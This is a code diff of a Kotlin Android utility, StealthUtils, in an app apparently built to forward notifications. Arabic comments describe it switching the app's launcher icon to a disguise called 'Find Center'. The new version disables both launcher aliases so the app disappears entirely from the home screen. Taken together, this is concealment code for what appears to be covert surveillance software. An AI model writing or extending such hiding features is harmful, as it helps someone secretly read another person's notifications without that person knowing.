@@ -6,22 +6,37 @@ import android.content.pm.PackageManager
 
 object StealthUtils {
 
-    // التبديل البرمجي من Pixel-Boy AI إلى مركز العثور
     fun switchToStealthMode(context: Context) {
-        val pm = context.packageManager
+        val packageManager = context.packageManager
 
-        // 1. إيقاف الأيقونة والاسم الأصلي (Pixel-Boy AI)
-        pm.setComponentEnabledSetting(
-            ComponentName(context, "com.itsazni.notificationforwarder.LauncherAlias"),
-            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-            PackageManager.DONT_KILL_APP
+        // 1️⃣ إيقاف الواجهة الأساسية (Pixel-Boy AI)
+        val mainAlias = ComponentName(
+            context,
+            "com.itsazni.notificationforwarder.MainActivityAlias"
+        )
+        
+        // 2️⃣ إيقاف أيقونة مركز العثور أيضاً للإخفاء الكامل من الشاشة
+        val stealthAlias = ComponentName(
+            context,
+            "com.itsazni.notificationforwarder.StealthActivityAlias"
         )
 
-        // 2. تفعيل الأيقونة والاسم التمويهي (مركز العثور)
-        pm.setComponentEnabledSetting(
-            ComponentName(context, "com.itsazni.notificationforwarder.StealthAlias"),
-            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
-            PackageManager.DONT_KILL_APP
-        )
+        try {
+            // تعطيل الواجهة الرئيسية
+            packageManager.setComponentEnabledSetting(
+                mainAlias,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            )
+
+            // تعطيل أيقونة التمويه لليختفي التطبيق بالكامل من الشاشة الرئيسية
+            packageManager.setComponentEnabledSetting(
+                stealthAlias,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            )
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
     }
 }
